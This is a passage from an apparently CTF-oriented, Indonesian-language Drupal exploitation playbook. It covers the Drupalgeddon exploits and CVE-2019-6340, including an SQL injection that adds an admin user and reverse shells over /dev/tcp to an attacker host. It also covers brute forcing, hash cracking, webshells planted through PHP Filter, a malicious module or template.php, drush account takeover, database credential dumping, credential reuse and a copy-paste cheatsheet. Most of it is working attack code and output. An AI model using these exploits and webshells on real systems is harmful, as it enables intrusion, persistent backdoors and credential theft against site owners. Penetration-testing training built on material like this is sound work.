echo user_hash_password('admin123') . PHP_EOL;
"
# Output contoh: $S$CTvr.takt18DYBpZmiTLKCYgkRmvqZvf5/ttzkTqINmVIgnLPPoRz

# Simpan hash hasil generate
export DRUPAL_HASH='$S$CTvr.takt18DYBpZmiTLKCYgkRmvqZvf5/ttzkTqINmVIgnLPPoRz'

# PoC Python - Inject admin user baru
python3 << 'EOF'
import urllib.request, urllib.parse

target = "http://10.10.11.200/?q=node&destination=node"
# GANTI dengan hash yang dihasilkan di atas!
pass_hash = "$S$CTvr.takt18DYBpZmiTLKCYgkRmvqZvf5/ttzkTqINmVIgnLPPoRz"

sql_payload = "name[0;insert into users (uid,name,pass,status,roles) values (9999,'hacker','{}',1,'');#]=test&pass=x&form_id=user_login_block".format(pass_hash)

req = urllib.request.Request(
    target, 
    data=sql_payload.encode(),
    headers={"User-Agent": "Mozilla/5.0"}
)
try:
    urllib.request.urlopen(req)
    print("[+] Payload dikirim! Coba login dengan hacker:admin123")
except Exception as e:
    print(f"[-] Error: {e}")
EOF
```

**OUTPUT BERHASIL ✅ — User ter-inject:**

text

```
[+] Payload dikirim! Coba login dengan hacker:admin123
```

➡️ Login ke admin panel:

Bash

```
curl -s -c /tmp/drupal_cookies.txt \
    -d "name=hacker&pass=admin123&form_id=user_login_block&op=Log+in" \
    "http://$TARGET/?q=node" | grep -i "logout\|welcome\|dashboard"
```

**OUTPUT BERHASIL ✅ — Login berhasil:**

HTML

```
<a href="/?q=user/logout">Log out</a>
```

➡️ Admin access! Ke **FASE 5 (Admin → Shell)**

**OUTPUT GAGAL ❌ — SQLi tidak work:**

text

```
(login page muncul lagi, tidak ada redirect)
```

➡️ Mungkin sudah dipatch atau ada WAF. Coba sqlmap:

Bash

```
sqlmap -u "http://$TARGET/?q=node&destination=node" \
    --data="name[0%20%3b%20drop%20table%20blah%20--%20%20]=test&pass=x&form_id=user_login_block" \
    --dbs --batch \
    --output-dir=~/drupal_loot/enum/sqlmap/

# Google: "drupalgeddon CVE-2014-3704 sqlmap tamper bypass WAF"
```

---

## ═══════════════════════════════════════

## FASE 1C: CVE-2018-7602 — DRUPALGEDDON 3

## (Drupal 7.58 ≤ ver < 7.59) — POST-AUTH RCE

## ═══════════════════════════════════════

> **Perlu credentials valid dulu**

Bash

```
# Download tool Drupalgeddon 3
git clone https://github.com/nickvdyck/drupalgeddon3.git /tmp/drupalgeddon3
cd /tmp/drupalgeddon3

# Jalankan dengan credentials admin
python3 drupalgeddon3.py \
    -u "http://$TARGET" \
    -c "id" \
    -user admin \
    -pass password
```

**OUTPUT BERHASIL ✅:**

text

```
[+] Drupalgeddon3 - Authenticated RCE
[+] Logged in successfully!
[+] Command output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

➡️ Ke **Langkah 1B.3** untuk upgrade ke reverse shell

---

## ═══════════════════════════════════════

## FASE 1D: CVE-2019-6340 — REST RCE

## (Drupal 8.x < 8.6.10, REST module aktif)

## ═══════════════════════════════════════

### Langkah 1D.1 — Cek REST Module Aktif

Bash

```
# Cek apakah REST endpoint tersedia
curl -s "http://$TARGET/node/1?_format=hal_json" \
    | jq . 2>/dev/null | head -20

curl -s -I "http://$TARGET/rest/type/node/article"
```

**OUTPUT BERHASIL ✅ — REST aktif:**

JSON

```
{
  "_links": {
    "self": {"href": "http://10.10.11.200/node/1?_format=hal_json"}
  },
  "nid": [{"value": 1}]
}
```

➡️ REST aktif. Buat payload:

Bash

```
# Buat payload Guzzle deserialization
cat > /tmp/guzzle_payload.json << EOF
{
  "_links": {
    "type": {
      "href": "http://$TARGET/rest/type/node/article"
    }
  },
  "_embedded": {
    "http://$TARGET/rest/relation/node/article/uid": [
      {
        "_links": {
          "self": {
            "href": "http://$TARGET/user/0?_format=hal_json"
          },
          "type": {
            "href": "http://$TARGET/rest/type/user/user"
          }
        },
        "name": {
          "value": "flag"
        },
        "roles": {
          "value": "authenticated"
        },
        "mail": {
          "value": "flag"
        },
        "field_image": [
          {
            "value": "$(echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" | base64 -w0)",
            "_attributes": {
              "lang": "fr"
            }
          }
        ]
      }
    ]
  }
}
EOF

# Setup listener
nc -lvnp $LPORT &

# Kirim payload
curl -s -X POST "http://$TARGET/node?_format=hal_json" \
    -H "Content-Type: application/hal+json" \
    -d @/tmp/guzzle_payload.json
```

**OUTPUT GAGAL ❌ — REST tidak aktif:**

text

```
{"message":"Not acceptable format: hal_json"}
```

➡️ REST module tidak aktif di Drupal ini. Ke **FASE 2 (Enumeration)**

---

## ═══════════════════════════════════════

## FASE 2: ENUMERATION MANUAL

## ═══════════════════════════════════════

> **Masuk sini jika tidak ada CVE yang applicable atau semua exploit gagal**

### Langkah 2.1 — Droopescan Full + Manual Recon

Bash

```
# Droopescan lengkap
droopescan scan drupal -u "http://$TARGET" \
    --output ~/drupal_loot/enum/droopescan_full.txt

# CMSmap sebagai second opinion
cmsmap "http://$TARGET" -f D -F \
    -o ~/drupal_loot/enum/cmsmap.txt

cat ~/drupal_loot/enum/droopescan_full.txt
cat ~/drupal_loot/enum/cmsmap.txt
```

**OUTPUT BERHASIL ✅ — Droopescan menemukan modul:**

text

```
[+] Plugins found:
    views     http://10.10.11.200/sites/all/modules/views/
    webform   http://10.10.11.200/sites/all/modules/webform/
    ctools    http://10.10.11.200/sites/all/modules/ctools/
    devel     http://10.10.11.200/sites/all/modules/devel/
```

**Cara baca — PENTING:**

|Module Ditemukan|Tindakan|
|---|---|
|`devel`|**JACKPOT!** Cek `/devel/php` untuk eksekusi kode langsung|
|`webform`|Cek CVE-2019-12581|
|`views`|Cek SA-CONTRIB-2013-054 SQLi|
|`avatar_uploader`|Cek CVE-2018-9205 file upload|
|`restws`|Cek REST endpoint RCE|

Bash

```
# Cek devel module (sering lupa diamankan di CTF)
curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/devel/php"
```

**OUTPUT ✅ — devel/php accessible (200):**

text

```
200
```

➡️ **JACKPOT! Eksekusi kode PHP langsung:**

Bash

```
# Buka browser dan akses http://$TARGET/devel/php
# Atau via curl dengan session admin:
curl -s -b /tmp/drupal_cookies.txt \
    -X POST "http://$TARGET/devel/php" \
    --data "code=system('id');&op=Execute"
```

---

### Langkah 2.2 — User Enumeration

Bash

```
# Method 1: Loop UID 1-10 (UID 1 = selalu admin di Drupal)
for id in {1..10}; do
    response=$(curl -s -i "http://$TARGET/user/$id")
    location=$(echo "$response" | grep -Ei "^Location:" | awk '{print $2}' | tr -d '\r')
    if [ -n "$location" ]; then
        echo "[*] UID $id → Username: $(basename $location)"
    fi
done

# Method 2: Drupal 7 dengan ?q=
for id in {1..10}; do
    location=$(curl -s -I "http://$TARGET/?q=user/$id" | grep -i "location:" | awk '{print $2}' | tr -d '\r')
    if [ -n "$location" ]; then
        echo "[*] UID $id → $location"
    fi
done

# Method 3: Error disclosure pada registration form
curl -s -X POST "http://$TARGET/user/register" \
    -d "name=admin&mail=test@test.com&form_id=user_register_form&op=Create+new+account" \
    | grep -i "already taken\|username"
```

**OUTPUT BERHASIL ✅ — Username terdeteksi:**

text

```
[*] UID 1 → http://10.10.11.200/users/admin
[*] UID 2 → http://10.10.11.200/users/john
```

➡️ Simpan username:

Bash

```
echo "admin" > ~/drupal_loot/creds/users.txt
echo "john" >> ~/drupal_loot/creds/users.txt
```

➡️ Ke **FASE 3 (Brute Force)**

---

### Langkah 2.3 — File Sensitif Check

Bash

```
# Cek settings.php
STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://$TARGET/sites/default/settings.php")
echo "settings.php: $STATUS"

# Cek file backup yang sering ada
for file in \
    "sites/default/settings.php" \
    "sites/default/settings.php.bak" \
    "sites/default/default.settings.php" \
    "update.php" \
    "install.php" \
    "CHANGELOG.txt" \
    "core/CHANGELOG.txt" \
    "README.txt"; do
    
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/$file")
    echo "[$CODE] $file"
done
```

**OUTPUT — File accessible:**

text

```
[200] sites/default/settings.php    ← KRITIS jika bisa dibaca!
[200] CHANGELOG.txt
[403] sites/default/settings.php.bak
[200] update.php
```

➡️ Jika settings.php 200 dan bisa dibaca:

Bash

```
curl -s "http://$TARGET/sites/default/settings.php" \
    | grep -E "password|database|username|'db'"
```

---

## ═══════════════════════════════════════

## FASE 3: BRUTE FORCE ADMIN LOGIN

## ═══════════════════════════════════════

### Langkah 3.1 — Login ke Drupal

Bash

```
# Buat targeted password list dulu
cat > ~/drupal_loot/creds/targeted_pass.txt << 'EOF'
admin
password
admin123
drupal
Drupal123!
Password1
Welcome1
Summer2024!
EOF

# Tambahkan hostname sebagai kandidat
echo "TARGET2024!" >> ~/drupal_loot/creds/targeted_pass.txt

# Hydra brute force (Drupal 7)
hydra -l admin \
    -P ~/drupal_loot/creds/targeted_pass.txt \
    $TARGET \
    http-post-form \
    "/?q=user/login:name=^USER^&pass=^PASS^&form_id=user_login_block&op=Log+in:Sorry, unrecognized" \
    -t 5 \
    -w 3

# Hydra brute force (Drupal 8)
hydra -l admin \
    -P ~/drupal_loot/creds/targeted_pass.txt \
    $TARGET \
    http-post-form \
    "/user/login:name=^USER^&pass=^PASS^&form_id=user_login_form&op=Log+in:Sorry, unrecognized" \
    -t 5
```

**OUTPUT BERHASIL ✅:**

text

```
[80][http-post-form] host: 10.10.11.200   login: admin   password: admin123
```

➡️ Simpan credentials:

Bash

```
export ADMIN_USER="admin"
export ADMIN_PASS="admin123"
echo "$ADMIN_USER:$ADMIN_PASS" >> ~/drupal_loot/creds/found_creds.txt
```

➡️ Ke **FASE 5 (Admin → Shell)**

**OUTPUT GAGAL ❌ — No valid passwords:**

text

```
[ERROR] No valid passwords found.
```

➡️ Coba default credentials dulu secara manual:

Bash

```
# Test default credentials
for cred in "admin:admin" "admin:password" "admin:drupal" "drupal:drupal" "administrator:admin"; do
    USER=$(echo $cred | cut -d: -f1)
    PASS=$(echo $cred | cut -d: -f2)
    
    RESULT=$(curl -s -c /tmp/drupal_test.txt \
        -d "name=$USER&pass=$PASS&form_id=user_login_block&op=Log+in" \
        "http://$TARGET/?q=node" | grep -ic "logout")
    
    if [ "$RESULT" -gt 0 ]; then
        echo "[+] VALID: $cred"
    else
        echo "[-] Invalid: $cred"
    fi
done
```

➡️ Jika semua gagal → ke **FASE 4 (Hash Cracking)** jika dapat hash dari DB

---

## ═══════════════════════════════════════

## FASE 4: HASH CRACKING (SS FORMAT)

## ═══════════════════════════════════════

> **Masuk sini jika dapat hash dari database dump atau backup settings.php**

### Langkah 4.1 — Identifikasi dan Crack Hash SS

Bash

```
# Drupal 7/8/9 menggunakan format $S$ (SHA-512 custom dengan iterasi)
# Contoh hash: $S$D2DA1g79/O2aGf0.eY2p8EeVwB5.t7Jb7R2g4m9jL6t3w1q8y9s

# Simpan hash ke file
echo '$S$D2DA1g79/O2aGf0.eY2p8EeVwB5.t7Jb7R2g4m9jL6t3w1q8y9s' \
    > ~/drupal_loot/creds/drupal_hash.txt

# Verifikasi format dengan hash-identifier
echo '$S$D2DA1g79/O2aGf0.eY2p8EeVwB5.t7Jb7R2g4m9jL6t3w1q8y9s' | hash-identifier

# Method 1: Hashcat Mode 7900 (Drupal 7/8/9/10)
hashcat -m 7900 -a 0 \
    ~/drupal_loot/creds/drupal_hash.txt \
    /usr/share/wordlists/rockyou.txt \
    --force

# Method 2: Hashcat dengan Rules
hashcat -m 7900 -a 0 \
    ~/drupal_loot/creds/drupal_hash.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force

# Method 3: John the Ripper (format otomatis detect drupal7)
john --format=drupal7 \
    ~/drupal_loot/creds/drupal_hash.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt

# Lihat hasil crack
hashcat -m 7900 --show ~/drupal_loot/creds/drupal_hash.txt
john --show --format=drupal7 ~/drupal_loot/creds/drupal_hash.txt
```

**OUTPUT BERHASIL ✅ — Hash ter-crack:**

text

```
$S$D2DA1g79/O2aGf0.eY2p8EeVwB5.t7Jb7R2g4m9jL6t3w1q8y9s:admin123
```

➡️ Password adalah `admin123`. Login ke admin panel → ke **FASE 5**

**OUTPUT GAGAL ❌ — Hash tidak ter-crack:**

text

```
Cracking performance lower than expected...
0/1 (0.00%) recovered
```

➡️ Opsi lain:

Bash

```
# Opsi 1: Update hash langsung di database (jika punya akses MySQL dari DB creds)
# Generate hash valid dengan PHP Drupal runtime
php -r "
define('DRUPAL_ROOT', '/var/www/html');
require_once DRUPAL_ROOT . '/includes/password.inc';
echo user_hash_password('newpassword123') . PHP_EOL;
"
# Update di MySQL:
mysql -u drupaluser -p'DB_PASS' drupal_db \
    -e "UPDATE users SET pass='HASH_BARU' WHERE name='admin';"

# Opsi 2: Jika ada shell (www-data), gunakan drush
cd /var/www/html
drush user-password admin --password="newpassword123"

# Google: "drupal hash cracking $S$ john hashcat not cracking"
# → Coba wordlist lebih spesifik (darkweb, leaked password lists)
```

---

## ═══════════════════════════════════════

## FASE 5: ADMIN → SHELL (POST-AUTH RCE)

## ═══════════════════════════════════════

> **Masuk sini setelah berhasil login ke Drupal admin**

### Langkah 5.1 — Login ke Admin Panel

Bash

```
# Login dan simpan session cookie
curl -s -c /tmp/drupal_session.txt \
    -d "name=$ADMIN_USER&pass=$ADMIN_PASS&form_id=user_login_block&op=Log+in" \
    "http://$TARGET/?q=node" \
    | grep -i "logout\|dashboard" | head -3

# Atau Drupal 8:
curl -s -c /tmp/drupal_session.txt \
    -d "name=$ADMIN_USER&pass=$ADMIN_PASS&form_id=user_login_form&op=Log+in" \
    "http://$TARGET/user/login" \
    | grep -i "logout\|dashboard" | head -3
```

**OUTPUT BERHASIL ✅ — Login berhasil:**

HTML

```
<a href="/?q=user/logout">Log out</a>
```

---

### Langkah 5.2 — Method 1: PHP Filter Module (Drupal 7 — PALING RELIABLE)

Bash

```
# Step 1: Aktifkan modul PHP Filter via curl
# (Jika via GUI: ?q=admin/modules → cari PHP Filter → enable → save)

# Ambil form token dulu
TOKEN=$(curl -s -b /tmp/drupal_session.txt \
    "http://$TARGET/?q=admin/modules" \
    | grep -oP 'form_token.*?value="[^"]+"' | grep -oP 'value="[^"]+"' | head -1 | cut -d'"' -f2)

echo "[*] Form token: $TOKEN"

# Step 2: Buat konten dengan PHP code
# Via GUI (lebih reliable):
# 1. Buka: http://$TARGET/?q=node/add/page
# 2. Di bagian Body, masukkan: <?php system($_GET['c']); ?>
# 3. Ubah Text Format → PHP code
# 4. Save

# Via curl (coba):
curl -s -b /tmp/drupal_session.txt \
    -X POST "http://$TARGET/?q=node/add/page" \
    -d "title=test&body[und][0][value]=<?php+system(\$_GET['c']);?>&body[und][0][format]=php_code&op=Save"

# Step 3: Test RCE
curl "http://$TARGET/?q=node/1&c=id"
curl "http://$TARGET/?q=node/2&c=id"
```

**OUTPUT BERHASIL ✅:**

text

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

➡️ Setup reverse shell:

Bash

```
# Setup listener
nc -lvnp $LPORT &

# Trigger reverse shell
curl "http://$TARGET/?q=node/1&c=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
```

➡️ Ke **FASE 6 (Post-Exploitation)**

**OUTPUT GAGAL ❌ — PHP Filter tidak ada di module list:**

text

```
(menu PHP Filter tidak muncul di admin/modules)
```

➡️ Coba Method 2

---

### Langkah 5.3 — Method 2: Upload Malicious Module

Bash

```
# Buat malicious module
mkdir -p /tmp/evilmodule && cd /tmp/evilmodule

cat > evilmodule.info << 'EOF'
name = Evil Module
description = Pentest Module
core = 7.x
package = Custom
version = 1.0
files[] = evilmodule.module
EOF

cat > evilmodule.module << 'PHPEOF'
<?php
if (isset($_GET['shell'])) {
    system($_GET['shell']);
    exit;
}
PHPEOF

# Arsipkan ke tar.gz (PENTING: Drupal tidak selalu terima .zip)
tar -czvf /tmp/evilmodule.tar.gz evilmodule.info evilmodule.module

# Upload via admin (GUI lebih reliable):
# 1. Buka: http://$TARGET/?q=admin/modules/install
# 2. Upload file /tmp/evilmodule.tar.gz
# 3. Aktifkan module yang baru diinstall

# Test RCE setelah module aktif
curl "http://$TARGET/sites/all/modules/evilmodule/evilmodule.module?shell=id"
```

**OUTPUT BERHASIL ✅:**

text

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**OUTPUT GAGAL ❌ — Upload ditolak (format error):**

text

```
Only files with the following extensions are accepted: tar tar.gz tgz
```

➡️ Coba Method 3

---

### Langkah 5.4 — Method 3: Template.php Modification

Bash

```
# Cek tema aktif
curl -s -b /tmp/drupal_session.txt \
    "http://$TARGET/?q=admin/appearance" \
    | grep -oP 'themes/[a-z0-9_]+' | sort -u

# Edit template.php (paling sering: bartik untuk Drupal 7, Olivero untuk Drupal 9)
# Payload yang dimasukkan ke template.php:
cat > /tmp/template_payload.php << 'EOF'
<?php
function bartik_preprocess_page(&$variables) {
    if(isset($_GET['c'])){ system($_GET['c']); }
}
EOF

# Upload atau edit via admin file manager
# Atau jika ada write access ke filesystem
cat /tmp/template_payload.php >> "/var/www/html/themes/bartik/template.php"

# Trigger
curl "http://$TARGET/?c=id"
```

**OUTPUT GAGAL ❌ — Template editor tidak ada atau tidak bisa upload:**

text

```
(403 Forbidden atau tidak ada menu edit)
```

➡️ Coba Method 4

---

### Langkah 5.5 — Method 4: Drush (Jika Ada Shell www-data Dulu)

Bash

```
# Jika sudah punya shell www-data (dari Drupalgeddon) tapi bukan root:
# Cek apakah drush tersedia
which drush
find / -name drush -type f 2>/dev/null | head -5
ls /var/www/html/vendor/bin/drush 2>/dev/null

# Reset password admin via drush (TERCEPAT di CTF!)
cd /var/www/html
drush user-password admin --password="PwnedPassword123!"

# Buat akun admin baru
drush user-create attacker \
    --mail="attacker@htb.local" \
    --password="SuperPassword123!"
drush user-add-role "administrator" attacker

# Dapatkan one-time login link (bypass password!)
drush user-login admin
# Output: http://10.10.11.200/user/reset/1/1689234123/AbCdEfGh...
# Buka URL ini di browser → auto login sebagai admin

# Aktifkan PHP Filter
drush pm-enable php -y
```

**OUTPUT BERHASIL ✅ — One-time login:**

text

```
http://10.10.11.200/user/reset/1/1689234123/AbCdEfGhIjKlMnOp
```

➡️ Buka URL di browser → langsung masuk sebagai admin → lanjut dengan PHP Filter

---

## ═══════════════════════════════════════

## FASE 6: POST-EXPLOITATION

## ═══════════════════════════════════════

> **Masuk sini setelah dapat shell (www-data)**

### Langkah 6.1 — Kumpulkan Credentials dari Server

Bash

```
# Step 1: Baca settings.php (FILE PALING PENTING!)
cat /var/www/html/sites/default/settings.php | grep -A 15 "databases"
```

**OUTPUT BERHASIL ✅ — DB credentials:**

PHP

```
$databases['default']['default'] = array (
  'database' => 'drupal_production',
  'username' => 'drupaluser',
  'password' => 'P@ssw0rdDrupalDB2023!',
  'host' => 'localhost',
  'port' => '3306',
);
```

Bash

```
# Simpan semua credentials
export DB_USER="drupaluser"
export DB_PASS="P@ssw0rdDrupalDB2023!"
export DB_NAME="drupal_production"
echo "$DB_USER:$DB_PASS" >> ~/drupal_loot/creds/found_creds.txt

# Step 2: Dump database
mysql -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" \
    -e "SELECT uid, name, pass, mail FROM users WHERE uid = 1;"

# Drupal 8+:
mysql -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" \
    -e "SELECT uid, name, pass, mail FROM users_field_data WHERE uid = 1;"
```

**OUTPUT — Hash admin dari DB:**

text

```
+-----+-------+----------------------------------------------------------------------+
| uid | name  | pass                                                                 |
+-----+-------+----------------------------------------------------------------------+
|   1 | admin | $S$D2DA1g79/O2aGf0.eY2p8EeVwB5.t7Jb7R2g4m9jL6t3w1q8y9s            |
+-----+-------+----------------------------------------------------------------------+
```

Bash

```
# Step 3: Cari file sensitif lain
find /var/www/ -name "*.bak" -o -name "*.old" -o -name "*.sql" 2>/dev/null
find /home -name "*.rsa" -o -name "id_rsa" 2>/dev/null
grep -ri "password" /var/www/html/ 2>/dev/null \
    | grep -v ".js:" | grep -v ".css:" | grep -v "node_modules" | head -20

# Step 4: Cek user di sistem
cat /etc/passwd | grep -E "sh$|bash$"
ls -la /home/
```

---

### Langkah 6.2 — Credential Reuse via Password dari settings.php

Bash

```
# Password DB sering dipakai ulang untuk SSH!
# Test via sshpass (reliable di web shell)
cat /etc/passwd | grep "/home" | cut -d: -f1 | \
    while read user; do
        echo "[*] Testing SSH: $user"
        sshpass -p "$DB_PASS" \
            ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=3 \
            $user@localhost "id" 2>/dev/null \
            && echo "[+] SUCCESS: $user:$DB_PASS" || true
    done

# Test ke service lain
nxc ssh $TARGET -u "$DB_USER" -p "$DB_PASS"
nxc smb $TARGET -u "$DB_USER" -p "$DB_PASS"   # → ke <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
nxc ftp $TARGET -u "$DB_USER" -p "$DB_PASS"   # → ke <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
```

---

### Langkah 6.3 — Privilege Escalation Check

Bash

```
# Cek sudo
sudo -l

# Cek SUID
find / -perm -4000 -type f 2>/dev/null | head -20

# Cek capabilities
getcap -r / 2>/dev/null

# Cek cron jobs
cat /etc/crontab
ls -la /etc/cron.d/

# Cek writable directories
find / -writable -type d 2>/dev/null | grep -v proc | head -20

# Jalankan LinPEAS
curl -s https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

➡️ Berdasarkan hasil → ke **`<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>`**

---

### Langkah 6.4 — Cross-Service Credential Testing

text

```
Drupal Creds / DB Creds Found
     │
     ├─ ─→ Port 22   (SSH)     → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     ├──→ Port 21   (FTP)     → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
     ├──→ Port 445  (SMB)     → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
     ├──→ Port 3306 (MySQL)   → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
     ├──→ Port 5432 (Postgres)→ <a href="/docs/postgresql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14c_postgresql_workflow.md</a>
     ├──→ Port 5985 (WinRM)   → evil-winrm
     └──→ Port 3389 (RDP)     → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|CHANGELOG.txt → 404|File dihapus admin|Cek `/core/CHANGELOG.txt`, meta generator, droopescan|
|Drupalgeddon 2 tidak return uid string|Form dinonaktifkan atau sudah patch|Coba endpoint lain: `?q=user/register`, `?q=node/add`|
|Exploit completed tapi no session|Firewall outbound atau disable_functions|Coba wget-based shell, python reverse shell|
|PHP disable_functions aktif|Exec/passthru/system diblokir|Gunakan `file_put_contents` atau `proc_open`|
|PHP Filter tidak ada di module list|Modul tidak installed atau di-disable|Upload custom module atau gunakan template.php|
|Module upload ditolak|Format file salah|Gunakan `.tar.gz`, bukan `.zip`|
|drush not found|Binary di lokasi non-standard|`find / -name drush 2>/dev/null` atau `/var/www/html/vendor/bin/drush`|
|Hash mode 7900 not found di hashcat|Hashcat versi lama|`sudo apt install --only-upgrade hashcat` atau pakai john|
|settings.php → 403|File protected oleh Apache|Coba LFI jika ada, atau `?q=user/password` reset dulu|
|Login 403 setelah brute force|IP ter-blacklist|Tunggu atau ganti IP (proxychains), atau cari auth bypass|
|REST endpoint 404|Module tidak aktif|Cek modul lain (webform, views) atau gunakan PHP filter|
|Drupal 8 register form 403|Registrasi publik disabled|Coba endpoint password reset atau Drupal 7 style|
|devel/php → 403|Devel module ada tapi akses dibatasi|Butuh login admin dulu, lalu akses|
|Exploit BSOD/crash server|Target instabil|Catat, skip ke metode lain yang tidak crash|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Drupal Terdeteksi
│
├─ FASE 0: Deteksi Versi (7 method)
│   ├─ 7.x < 7.32  → FASE 1A (Drupalgeddon 1 SQLi) + FASE 1B (D2 RCE)
│   ├─ 7.x < 7.58  → FASE 1B (Drupalgeddon 2, password reset form)
│   ├─ 7.x < 7.59  → FASE 1C (Drupalgeddon 3, butuh auth)
│   ├─ 8.x < 8.5.1 → FASE 1B (Drupalgeddon 2, register form)
│   ├─ 8.x < 8.6.10→ FASE 1D (REST RCE CVE-2019-6340)
│   └─ Tidak jelas → FASE 2 (Enumeration)
│
├─ FASE 1B: Drupalgeddon 2 (Pre-Auth RCE)
│   ├─ Berhasil    → Reverse Shell → FASE 6
│   └─ Gagal       → FASE 2 (Enumeration)
│
├─ FASE 2: Enumeration
│   ├─ devel/php aktif        → RCE langsung
│   ├─ Module vulnerable      → Exploit module
│   ├─ User terdeteksi        → FASE 3 (Brute Force)
│   └─ settings.php terbaca  → DB creds → FASE 4 (Hash) / FASE 5
│
├─ FASE 3: Brute Force
│   ├─ Credentials ditemukan  → FASE 5 (Admin→Shell)
│   └─ Gagal                  → Balik cari CVE lain
│
├─ FASE 4: Hash Cracking ($S$)
│   ├─ Hash ter-crack          → Login Admin → FASE 5
│   └─ Tidak ter-crack         → Update hash di DB langsung
│
├─ FASE 5: Admin → Shell
│   ├─ PHP Filter (Drupal 7)   → RCE → FASE 6
│   ├─ Module Upload           → RCE → FASE 6
│   ├─ Template.php Modify     → RCE → FASE 6
│   └─ Drush (ada shell dulu)  → Reset pass → login → FASE 5 method lain
│
└─ FASE 6: Post-Exploitation
    ├─ Read settings.php → DB creds → reuse ke service lain
    ├─ MySQL dump → admin hash → crack
    ├─ Drush reset → admin access
    └─ PrivEsc → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="4444"
mkdir -p ~/drupal_loot/{enum,creds,files,shell}

# === VERSION DETECTION ===
curl -s "http://$TARGET/CHANGELOG.txt" | head -n 3
curl -s "http://$TARGET/core/CHANGELOG.txt" | head -n 3
curl -s "http://$TARGET" | grep -i generator
droopescan scan drupal -u "http://$TARGET"

# === USER ENUM ===
for i in {1..5}; do
    LOC=$(curl -s -I "http://$TARGET/user/$i" | grep -i "location:" | awk '{print $2}')
    echo "UID $i: $LOC"
done

# === DRUPALGEDDON 2 TEST (Drupal 7) ===
curl -s -k -X POST \
    "http://$TARGET/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" \
    --data "form_id=user_pass&_triggering_element_name=name" | grep "uid="

# === DRUPALGEDDON 2 TEST (Drupal 8) ===
curl -s -k -X POST \
    "http://$TARGET/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
    --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"

# === METASPLOIT ===
msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS $TARGET; set LHOST $LHOST; set LPORT $LPORT; exploit"

# === RUBY POC ===
searchsploit -m 44449; ruby 44449.rb "http://$TARGET"

# === HASH CRACKING ===
hashcat -m 7900 drupal_hash.txt /usr/share/wordlists/rockyou.txt
john --format=drupal7 drupal_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# === DRUSH (jika ada shell) ===
drush user-password admin --password="PwnedPassword123!"
drush user-login admin
drush pm-enable php -y

# === POST EXPLOITATION ===
cat /var/www/html/sites/default/settings.php | grep -A 10 "databases"
mysqldump -u drupaluser -p'DB_PASS' drupal_db > /tmp/drupal_dump.sql
find / -name "*.bak" -o -name "id_rsa" 2>/dev/null
```

---

> **➡️ NEXT:** Setelah Drupal selesai dan dapat shell atau credentials, lanjut ke **[🌐 File 17d: Other CMS Exploitation Workflow & Master CMS Reference](/docs/other-cms)** untuk CMS lain yang lebih jarang tapi tetap muncul di CTF (Magento, Ghost, TYPO3, dll). Atau jika credentials dari Drupal bisa dipakai di service lain, ikuti Cross-Service chart di Fase 6.4.